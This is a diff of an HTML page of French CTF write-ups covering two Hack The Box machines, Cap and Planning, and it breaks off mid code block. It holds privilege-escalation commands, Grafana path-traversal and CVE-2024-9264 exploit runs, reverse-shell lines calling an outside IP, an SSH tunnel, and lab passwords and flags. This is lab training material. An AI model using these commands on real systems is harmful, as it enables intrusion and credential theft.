@@ -1,788 +1,397 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fr3nch4Sec - Writeups CTF</title>
-    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Hack:wght@400&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style/style.css"> <!-- Chemin dans dossier style/ -->
-    <!-- Highlight.js neutre -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css" id="highlight-theme">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-    <style>
-        /* Styles pour accordéon moderne (amélioré pour éviter clips) */
-        .writeup-content {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.5s ease-out, padding 0.3s ease-out; /* Transition plus douce */
-            padding: 0 15px;
-        }
-        .writeup-content.open {
-            max-height: none; /* Pas de limite fixe pour éviter coupures */
-            overflow: visible; /* Visible complet quand ouvert */
-            padding: 15px;
-        }
-        .clickable {
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            position: relative;
-            user-select: none;
-        }
-        .clickable::after {
-            content: '+';
-            font-size: 1.5em;
-            font-weight: bold;
-            position: absolute;
-            right: 0;
-            transition: transform 0.3s ease;
-        }
-        .clickable.open::after {
-            content: '−';
-            transform: rotate(180deg);
-        }
-        .clickable:hover {
-            color: var(--accent-color, #4a7043);
-        }
-        /* Fix pour code blocks (anti-saccadé et visibilité lignes shell) */
-        .writeup-content pre {
-            white-space: pre-wrap; /* Wrap lignes longues sans saccades */
-            line-height: 1.4; /* Espacement uniforme pour lignes shell */
-            margin: 15px 0 !important; /* Espace au-dessus/en-dessous pour éviter chevauchement */
-            overflow-x: auto;
-            overflow-y: visible; /* Toutes les lignes visibles */
-            display: block;
-            width: 100%;
-            padding: 10px;
-            border-radius: 5px;
-            font-family: 'Hack', monospace;
-            font-size: 0.9em; /* Légèrement plus petit pour lisibilité */
-        }
-        .writeup-content code {
-            line-height: 1.4; /* Uniformité */
-            white-space: pre-wrap;
-            margin: 0;
-        }
-        .writeup-content pre code {
-            display: block;
-            padding: 0;
-            margin: 0;
-            white-space: pre-wrap; /* Assure wrap dans Highlight.js */
-        }
-        /* Évite chevauchement avec texte adjacent */
-        .writeup-content h3, .writeup-content p {
-            margin-bottom: 10px;
-        }
-        .writeup-content > *:first-child {
-            margin-top: 0;
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Fr3nch4Sec - Writeups CTF</title>
+
+  <!-- Marked.js -->
+  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+
+  <!-- Highlight.js -->
+  <link id="highlight-theme" rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+  <!-- Inline CSS (tout le style est embarqué pour avoir un seul fichier) -->
+  <style>
+    :root{
+      --bg-dark: #0d1117;
+      --text-dark: #e6edf3;
+      --accent-dark: #58a6ff;
+      --code-bg-dark: #161b22;
+      --code-green: #00ff7f;
+
+      --bg-light: #f6f8fa;
+      --text-light: #24292f;
+      --accent-light: #d81b60;
+      --code-bg-light: #f5f5f5;
+      --code-blue: #005cc5;
+    }
+
+    /* page layout */
+    html,body{height:100%;margin:0;padding:0;font-family:Inter, Arial, sans-serif;}
+    body{background:var(--bg-dark);color:var(--text-dark);padding:28px;transition:background .25s,color .25s;}
+    main{max-width:1100px;margin:0 auto;}
+
+    header h1{margin:0 0 6px;font-size:2rem;}
+    header p{margin:0 0 18px;color:rgba(230,237,243,0.85);}
+
+    /* theme toggle button */
+    .theme-toggle{
+      position:fixed;right:18px;top:18px;padding:8px 12px;border-radius:8px;border:0;cursor:pointer;
+      background:#1e90ff;color:#fff;font-weight:700;box-shadow:0 4px 12px rgba(0,0,0,0.25);
+    }
+
+    /* sections / cards */
+    .platform-section{margin-bottom:28px;padding:16px;border-radius:10px;background:rgba(30,30,30,0.85);}
+    .platform-section h2{margin:0 0 12px;color:var(--accent-dark);}
+
+    .writeup-item{margin:12px 0;padding:12px;border-radius:8px;background:rgba(50,50,50,0.55);position:relative;}
+    .writeup-item h3{margin:0;font-size:1.05rem;}
+    .clickable{cursor:pointer;display:flex;align-items:center;justify-content:space-between;gap:10px;padding-right:28px;}
+    .clickable span.title-text{flex:1}
+    .clickable::after{content:'+';font-size:1.2rem;font-weight:700;position:absolute;right:16px;top:14px;transition:transform .2s}
+    .clickable.open::after{content:'−';transform:rotate(180deg)}
+
+    /* accordion content */
+    .writeup-content{max-height:0;overflow:hidden;padding:0 8px;transition:max-height .45s ease,padding .25s;}
+    .writeup-content.open{padding:12px 8px;margin-top:8px;max-height:2000px;overflow:visible}
+
+    /* markdown content styling */
+    .writeup-content h1,.writeup-content h2,.writeup-content h3{color:var(--accent-dark);margin-top:8px}
+    .writeup-content p{margin:8px 0;color:inherit}
+    .writeup-content ul{margin:8px 0 8px 20px}
+    .writeup-content pre{background:var(--code-bg-dark);color:var(--code-green);padding:12px;border-radius:6px;overflow:auto;margin:10px 0;white-space:pre-wrap;font-family: "Hack", monospace;font-size:0.95rem}
+    .writeup-content code{background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px}
+
+    /* tables (make them non-intrusive) */
+    .writeup-content table{width:100%;table-layout:auto;border-collapse:collapse;margin:10px 0}
+    .writeup-content th,.writeup-content td{padding:6px 8px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.03);word-break:break-word}
+
+    /* images responsive */
+    .writeup-content img{max-width:100%;height:auto;border-radius:6px;margin:10px 0;display:block}
+
+    /* light mode overrides */
+    body.light-mode{
+      background:var(--bg-light);
+      color:var(--text-light);
+    }
+    body.light-mode .platform-section{background:#fff;border:1px solid #e6e6e6}
+    body.light-mode .writeup-item{background:#fafafa;border:1px solid #e8e8e8}
+    body.light-mode .platform-section h2{color:var(--accent-light)}
+    body.light-mode .clickable::after{color:#333}
+    body.light-mode .writeup-content pre{background:var(--code-bg-light);color:var(--code-blue)}
+
+    /* small screens */
+    @media (max-width:700px){
+      body{padding:18px}
+      .theme-toggle{right:12px;top:12px;padding:6px 10px}
+      header h1{font-size:1.5rem}
+    }
+  </style>
 </head>
 <body class="dark-mode">
-    <button id="theme-toggle" aria-label="Basculer mode jour/nuit">
-        <span class="theme-icon">🌙</span>
-    </button>
-    <h1>📂 Writeups CTF</h1>
-    <p>Voici mes writeups organisés par plateforme :</p>
-    <div class="writeup-list" id="writeupList">
-        <!-- Section Hack The Box -->
-        <div class="platform-section">
-            <h2>Hack The Box</h2>
-            <div class="writeup-item">
-                <h2 class="clickable"> Cap Machine - Easy</h2>
-                <div class="writeup-content">
-                    <script type="text/markdown">
+  <!-- Theme toggle -->
+  <button id="theme-toggle" class="theme-toggle" aria-label="Basculer thème"><span class="theme-icon">🌙</span></button>
+
+  <main>
+    <header>
+      <h1>📂 Writeups CTF</h1>
+      <p>Voici mes writeups organisés par plateforme :</p>
+    </header>
+
+    <div id="writeupList">
+
+      <!-- Hack The Box -->
+      <section class="platform-section">
+        <h2>Hack The Box</h2>
+
+        <!-- Cap Machine -->
+        <article class="writeup-item">
+          <h3 class="clickable"><span class="title-text">Cap Machine - Easy</span></h3>
+          <div class="writeup-content" aria-hidden="true">
+            <script type="text/markdown">
 # HackTheBox - Cap Machine - Easy
 
-1. **Reconnaissance**  
-### Scan des ports  
+1. **Reconnaissance**
+
+### Scan des ports
 Le Firewall de la machine bloque les scans basiques, avec transaction 'SynAck' complète.  
 J'utilise Naabu en premier avec Nmap sur chaque machine, car c'est super rapide.  
-Donc, j'ai utilisé le flag `-sS` dans Nmap, pour initier la connexion avec l'envoi de paquets. Si Nmap reçoit la réponse, le port est considéré comme ouvert.  
+Donc, j'ai utilisé le flag `-sS` dans Nmap, pour initier la connexion avec l'envoi de paquets. Si Nmap reçoit la réponse, le port est considéré comme ouvert.
+
 ```bash
 sudo naabu -host 10.10.10.245 -nmap-cli 'nmap -sS -sV -A -Pn -v'
-```
-PORT   STATE SERVICE VERSION  
-21/tcp open  ftp     vsftpd 3.0.3  
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)  
-80/tcp open  http    gunicorn  
 
-### Fuzzing de l'url avec Ffuf et Gobuster:  
-```bash
+Résultats (exemple formaté en code)
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
+80/tcp open  http    gunicorn
+
+Fuzzing de l'url avec Ffuf et Gobuster:
+
 ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/web-content/directory-list-2.3-medium.txt -recursion-depth 1
-```  
-```bash
+
 ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/dns/subdomains-top1million-5000.txt
-```  
-#### Résultats obtenus:  
-/ip  
-/netstat  
-/data  
 
-### Ensuite:  
-J'ai poursuivi la recherche de domaines et d'extensions potentielles.  
-Après un fuzzing par récursion, j'ai trouvé une page à '/data/0'.  
-Cette page permet de télécharger un fichier PCAP, lié à l'utilisateur.  
-Chose bizarre. La page était liée au même utilisateur mais les données présentes dans le PCAP différaient légèrement.  
-Pendant le fuzzing du domaine, le snapshot indiquait zéro en termes de paquets à chaque type (TCP, UDP, etc.).  
-J'ai téléchargé les PCAP à plusieurs reprises pour les comparer.  
-Je les ai inspectés avec Wireshark sans résultats. À première vue en tout cas.  
-J'ai trouvé sur des forums, des docs et autres, comment filtrer les données. Car oui, je pratique peu Wireshark.  
-J'ai donc lancé 'Protocol Hierarchy' sur le protocole FTP.  
+Résultats obtenus :
 
-En examinant les en-têtes, le mot de passe s'affiche directement. Et l'utilisateur, dans un paquet avec une IP liée à celui contenant le mot de passe.  
+/ip
+/netstat
+/data
 
-<link href="style.css" rel="stylesheet" />
-<style>
-  img {
-    width: 100%;
-    max-width: 500px;
-    height: auto;
-  }
-</style>
-<img src="https://github.com/Fr3nch4Sec/fr3nch4.github.io/blob/main/images/Cap_img_1.webp" alt="Vue de Wireshark" />
+Après avoir téléchargé un PCAP sur /data/0 et analysé avec Wireshark, j'ai trouvé des identifiants en clair dans les échanges FTP.
 
+    Exploitation
 
+Connexion SSH
 
-
-
-
-
-
-
-
-                        
-2. **Exploitation** :  
-#### Connexion SSH avec id & password  
-Je me suis servi de ce mot de passe afin de me connecter via SSH, avec l'utilisateur 'nathan'.  
-
-```bash
 ssh nathan@10.10.10.245
-```  
-On est dans la machine. 🖥️🖥️  
 
-J'ai téléchargé Linpeas 🤔  
+Extrait de session :
 
-```bash
 nathan@cap:~$ ls
 e.py  linpeas  linpeas.sh  snap  user.txt
 nathan@cap:~$ cat user.txt
 d2ee7e0a3b896efed8eeeeab2aeb1ff6
-nathan@cap:~/snap/bin$ ls
-Makefile  cve  cve-2021-4034.c  esc  exploit_nss.py  ls polkit  pwnkit.c
-```  
-J'ai rendu Linpeas exécutable, et l'ai lancé.  
-```bash
-chmod +x linpeas
-chmod +x linpeas.sh
-./linpeas
-./linpeas.sh
-```  
-Linpeas a indiqué dans la sortie que Python 3 disposait de la fonction 'cap_setuid' qui peut modifier l'UID d'un processus:  
-`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`  
-```bash
-nathan@cap:~$ ls
-snap user.txt
-nathan@cap:~$ cat user.txt
-bd615fdf252a03b75214aebaa4cb0714
-```  
 
-3. **Accès root** : Escalade de privilèges via la création d'un fichier SUID.  
-J'ai cherché sur l'extension Hacktools, sur des writeups, pour trouver comment élever les privilèges depuis un 'user' Linux.  
-J'en ai essayé plusieurs:  
-Cette commande m'a permis de passer de User à Root.  
+J'ai lancé linpeas et observé que /usr/bin/python3.8 possédait cap_setuid :
 
-```bash
-nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-```  
-```bash
-root@cap:~# ls
-snap user.txt
-root@cap:~# cd /root
-root@cap:/root# ls
-root.txt snap
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+
+    Accès root
+
+Escalade via Python cap_setuid :
+
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+Extrait root :
+
 root@cap:/root# cat root.txt
 b17a06939691f0e4f924f37138c32eeb
-root@cap:/root#
-```  
 
+Conclusion
 
-<link href="style.css" rel="stylesheet" />
-<style>
-  img {
-    width: 100%;
-    max-width: 500px;
-    height: auto;
-  }
-</style>
-<img src="https://github.com/Fr3nch4Sec/fr3nch4.github.io/blob/main/images/Cap_img_2.webp" alt="Élevation de privilèges" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                        
-                        
-### Conclusion  
 Une excellente machine pour apprendre les bases de l'énumération et de l'exploitation simple.
-                    </script>
-                </div>
-                
-            <div class="writeup-item">
-                <h2 class="clickable"> Planning HTB</h2>
-                <div class="writeup-content">
-                    <script type="text/markdown">
-                    # HTB Planning
+</script>
+</div>
+</article>
+
+    <!-- Planning HTB (le writeup que tu as ajouté) -->
+    <article class="writeup-item">
+      <h3 class="clickable"><span class="title-text">Planning HTB</span></h3>
+      <div class="writeup-content" aria-hidden="true">
+        <script type="text/markdown">
+
+HTB - Planning
 
 Write-up
 
-L’intitulé du CTF fourni des identifiants pour commencer.
+L’intitulé du CTF fournit des identifiants pour commencer.
 
 id: admin
-
 pwd: 0D5oT70Fq13EvB5r
+Reconnaissance
 
-# Reconnaissance
-
-```bash
 nmap -p- -sC -sV -O 10.10.11.68
 
+Extrait :
+
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
-|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
 80/tcp open  http    nginx 1.24.0 (Ubuntu)
-|_http-server-header: nginx/1.24.0 (Ubuntu)
-|_http-title: Did not follow redirect to http://planning.htb/
-```
 
-## Scan des vulnérabilités
+Scan des vulnérabilités
 
-```bash
 nuclei -target http://planning.htb
 
-[missing-sri] [http] [info] http://planning.htb ["https://code.jquery.com/jquery-3.4.1.min.js","https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"]
-[external-service-interaction] [http] [info] http://planning.htb
-[waf-detect:nginxgeneric] [http] [info] http://planning.htb
-[ssh-sha1-hmac-algo] [javascript] [info] planning.htb:22
-[ssh-server-enumeration] [javascript] [info] planning.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11"]
-[ssh-password-auth] [javascript] [info] planning.htb:22
-[ssh-auth-methods] [javascript] [info] planning.htb:22 ["["publickey","password"]"]
-[openssh-detect] [tcp] [info] planning.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11"]
-[form-detection] [http] [info] http://planning.htb
-[nginx-version] [http] [info] http://planning.htb ["nginx/1.24.0"]
-[http-missing-security-headers:strict-transport-security] [http] [info] http://planning.htb
-[http-missing-security-headers:permissions-policy] [http] [info] http://planning.htb
-[http-missing-security-headers:x-frame-options] [http] [info] http://planning.htb
-[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://planning.htb
-[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://planning.htb
-[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://planning.htb
-[http-missing-security-headers:content-security-policy] [http] [info] http://planning.htb
-[http-missing-security-headers:x-content-type-options] [http] [info] http://planning.htb
-[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://planning.htb
-[http-missing-security-headers:referrer-policy] [http] [info] http://planning.htb
-[http-missing-security-headers:clear-site-data] [http] [info] http://planning.htb
-[tech-detect:nginx] [http] [info] http://planning.htb
-[tech-detect:owl-carousel] [http] [info] http://planning.htb
-[caa-fingerprint] [dns] [info] planning.htb
-[INF] Scan completed in 1m. 24 matches found.
-```
+(quelques lignes de sortie : tech détect, headers manquants, etc.)
+Fuzzing
 
-## Fuzzing
+ffuf -c -w namelist.txt -H 'Host: FUZZ.planning.htb' -u http://10.10.11.68 -fc 301
 
-```bash
-$ ffuf -c -w namelist.txt -H 'Host: FUZZ.planning.htb' -u  http://10.10.11.68 -fc 301
+Résultat notable : grafana (302)
 
-grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 93ms]
-```
+Tester LFI sur Grafana :
 
-```bash
 curl --path-as-is -i "http://grafana.planning.htb/public/build/datasource/../../../../../../../../etc/passwd"
-```
 
-```bash
-$ curl -i "http://grafana.planning.htb/"
+Récupération de la version Grafana :
 
-HTTP/1.1 302 Found
-Server: nginx/1.24.0 (Ubuntu)
-Date: Sun, 21 Sep 2025 22:11:14 GMT
-Content-Type: text/html; charset=utf-8
-Content-Length: 29
-Connection: keep-alive
-Cache-Control: no-store
-Location: /login
-X-Content-Type-Options: nosniff
-X-Frame-Options: deny
-X-Xss-Protection: 1; mode=block
+curl -s "http://grafana.planning.htb/login" | grep -i version
+# "version":"11.0.0" ...
 
-<a href="/login">Found</a>.
-```
+Exploitation
 
-Cette commande permet de trouver la version de Grafana.
+Un exploit public pour CVE-2024-9264 est disponible : https://github.com/nollium/CVE-2024-9264
 
-```bash
-$ curl -s "http://grafana.planning.htb/login" | grep -i version
-                           
-"version":"11.0.0" et "Grafana v11.0.0 (83b9528bce)"
-```
+Lancer l'exploit (exemple) :
 
-```bash
-$ gobuster dir -u http://grafana.planning.htb -w directory-list-2.3-medium.txt -x php,js,txt --exclude-length 29
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd http://grafana.planning.htb:80
 
-/login                (Status: 200) [Size: 38241]
-/signup               (Status: 200) [Size: 38241]
-/public               (Status: 302) [Size: 31] [--> /public/]
-/admin                (Status: 302) [Size: 24] [--> /]
-/plugins              (Status: 302) [Size: 24] [--> /]
-/api.php              (Status: 401) [Size: 102]
-/api.js               (Status: 401) [Size: 102]
-/api                  (Status: 401) [Size: 102]
-/api.txt              (Status: 401) [Size: 102]
-/robots.txt           (Status: 200) [Size: 26]
-```
+Lecture de /etc/passwd réussie. Ensuite, tentative d'exécution de commandes et exfiltration :
 
-# Exploitation
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "cat /home/grafana/user.txt" http://grafana.planning.htb
 
-J'ai trouvé une faille pour Grafana version 11.
+Tentatives pour récupérer flags dans /home/grafana ont échoué (fichiers inexistants), mais lecture de /proc/1/environ et exécution de commandes permis :
 
-Ce repository fourni un exploit Python pour la https://github.com/nollium/CVE-2024-9264.git
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /proc/1/environ http://grafana.planning.htb
 
-Donc je l’ai lancé avec les creds initiaux, pour accéder à la base de données.
+Exemple : lecture d'environnement contenant GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT! (mot de passe potentiellement utile).
+Post-exploitation & pivot
 
-```bash
-python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -f /etc/passwd  http://grafana.planning.htb:80
- 
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Reading file: /etc/passwd
-[+] Successfully ran duckdb query:
-[+] SELECT content FROM read_blob('/etc/passwd'):
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-grafana:x:472:0::/home/grafana:/usr/sbin/nologin
-```
+SSH enzo@10.10.11.68 avec le mot de passe trouvé, exploration, découverte d'un service local sur le port 8000 (UI crontab), et découverte de mots de passe dans /opt/crontabs/crontab.db (ex : P4ssw0rdS0pRi0T3c).
 
-```bash
-┌──(.venv)─(kali㉿kali)-[~/Documents/htb/Planning/CVE-2024-9264]
-└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "cat /home/grafana/user.txt" http://grafana.planning.htb
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Executing command: cat /home/grafana/user.txt
-[-] Unexpected response format:
-[-] {
-    "results": {
-        "B": {
-            "error": "exit status 1IO Error: Pipe process exited with non-zero exit 
-code=\"1\": cat /home/grafana/user.txt >/tmp/grafana_cmd_output 2>&1 |\n",
-            "errorSource": "",
-            "status": 500,
-            "frames": []
-        }
-    }
-}
-[+] Successfully ran duckdb query:
-[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
-cat: /home/grafana/user.txt: No such file or directory
-                                                                                             
-┌──(.venv)─(kali㉿kali)-[~/Documents/htb/Planning/CVE-2024-9264]
-└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1" http://grafana.planning.htb
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Executing command: bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1
-[-] Unexpected response format:
-[-] {
-    "results": {
-        "B": {
-            "error": "exit status 1sh: 1: Syntax error: Bad fd number\nIO Error: Pipe process
-exited with non-zero exit code=\"2\": bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1 
->/tmp/grafana_cmd_output 2>&1 |\n",
-            "errorSource": "",
-            "status": 500,
-            "frames": []
-        }
-    }
-}
-[+] Successfully ran duckdb query:
-[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
-cat: /home/grafana/user.txt: No such file or directory
-```
+Utilisation d'un tunnel SSH pour accéder à l'UI crontab via navigateur local :
 
-```bash
- python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /home/grafana/flag.txt http://grafana.planning.htb
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Reading file: /home/grafana/flag.txt
-[-] File not found
-                                                                                             
-┌──(.venv)─(kali㉿kali)-[~/Documents/htb/Planning/CVE-2024-9264]
-└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /home/grafana/pass.txt http://grafana.planning.htb
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Reading file: /home/grafana/pass.txt
-[-] File not found
-```
-
-```bash
-python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "nc -e /bin/sh 10.10.15.17 4444" http://grafana.planning.htb
-```
-
-```bash
-$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /proc/1/environ http://grafana.planning.htb
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Reading file: /proc/1/environ
-[+] Successfully ran duckdb query:
-[+] SELECT content FROM read_blob('/proc/1/environ'):
-```
-
-```bash
-$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "env" http://grafana.planning.htb
-[+] Logged in as admin:0D5oT70Fq13EvB5r
-[+] Executing command: env
-[+] Successfully ran duckdb query:
-[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('env >/tmp/grafana_cmd_output 2>&1 |'):
-[+] Successfully ran duckdb query:
-[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
-GF_PATHS_HOME=/usr/share/grafana
-HOSTNAME=7ce659d667d7
-SHLVL=0
-AWS_AUTH_EXTERNAL_ID=
-HOME=/usr/share/grafana
-AWS_AUTH_AssumeRoleEnabled=true
-GF_PATHS_LOGS=/var/log/grafana
-GF_PATHS_PROVISIONING=/etc/grafana/provisioning
-GF_PATHS_PLUGINS=/var/lib/grafana/plugins
-PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-AWS_AUTH_AllowedAuthProviders=default,keys,credentials
-GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
-AWS_AUTH_SESSION_DURATION=15m
-GF_SECURITY_ADMIN_USER=enzo
-GF_PATHS_DATA=/var/lib/grafana
-GF_PATHS_CONFIG=/etc/grafana/grafana.ini
-AWS_CW_LIST_METRICS_PAGE_LIMIT=500
-PWD=/usr/share/grafana
-
-```
-
-Création d’un environnement dans le container Docker, qui me permet d’obtenir le mot de passe du user **enzo** *RioTecRANDEntANT*
-
-## Connexion SSH
-
-Avec le password trouvé précédemment.
-
-```bash
-$ ssh enzo@10.10.11.68     
-The authenticity of host '10.10.11.68 (10.10.11.68)' can't be established.
-ED25519 key fingerprint is SHA256:iDzE/TIlpufckTmVF0INRVDXUEu/k2y3KbqA/NDvRXw.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.11.68' (ED25519) to the list of known hosts.
-enzo@10.10.11.68's password: 
-Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)
-
-Last login: Sun Sep 21 23:57:11 2025 from 10.10.15.17
-enzo@planning:~$ 
-```
-
-```bash
-enzo@planning:~$ netstat -tulnp
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*              	 			LISTEN      -                   
-tcp        0      0 127.0.0.1:38283         0.0.0.0:*               			LISTEN      -                   
-tcp        0      0 127.0.0.1:33060         0.0.0.0:*               			LISTEN      -                   
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               				LISTEN      -                   
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               				LISTEN      -                   
-tcp        0      0 127.0.0.1:3000          0.0.0.0:*               			LISTEN      -                   
-tcp        0      0 127.0.0.54:53           0.0.0.0:*               				LISTEN      -                   
-tcp        0      0 127.0.0.1:8000          0.0.0.0:*               			LISTEN      -                   
-tcp6       0      0 :::22                   :::*                    						LISTEN      -                   
-udp        0      0 127.0.0.54:53           0.0.0.0:*                           			-                   
-udp        0      0 127.0.0.53:53           0.0.0.0:*                          			-         
-```
-
-Le port 8000 semble être intéressant.
-
-```bash
-enzo@planning:/$ ls
-bin@                boot/   dev/  home/  lib64@              lost+found/  mnt/  proc/  run/   sbin.usr-is-merged/  sys/  usr/
-bin.usr-is-merged/  cdrom/  etc/  lib@   lib.usr-is-merged/  media/       opt/  root/  sbin@  srv/                 tmp/  var/
-enzo@planning:/$ cd opt
-enzo@planning:/opt$ ls
-containerd  crontabs
-enzo@planning:/opt$ cd containerd
-enzo@planning:/opt/containerd$ ls
-ls: cannot open directory '.': Permission denied
-enzo@planning:/opt/containerd$ cd ..
-enzo@planning:/opt$ ls
-containerd  crontabs
-enzo@planning:/opt$ cd crontabs
-enzo@planning:/opt/crontabs$ ls
-crontab.db  env.db
-enzo@planning:/opt/crontabs$ cat env.db
-enzo@planning:/opt/crontabs$ cat crontab.db
-{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
-{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
-```
-
-Le fichier crontab.db contenait le password ***P4ssw0rdS0pRi0T3c .***
-
-J’ai créé un tunnel SSH pour le crontab avec les identifiants du user Enzo.
-
-```bash
 ssh -L 8000:127.0.0.1:8000 -N -f enzo@planning.htb
-```
+# puis ouvrir http://127.0.0.1:8000 dans le navigateur
 
-Je n’avais plus qu’à accéder au crontab UI dans le navigateur à l’adresse 127.0.0.1:8000 et me connecter avec les identifants.
+Création d'un cronjob qui sauvegarde l'image docker grafana et la zippe (extrait du crontab). Ajout d'un cron qui crée un bash setuid dans /tmp permettant d'obtenir root :
 
-```bash
-root
-P4ssw0rdS0pRi0T3c
-```
-
-Toujours dans l’UI crontab, j’ai ajouter un cronjob. 
-
-```bash
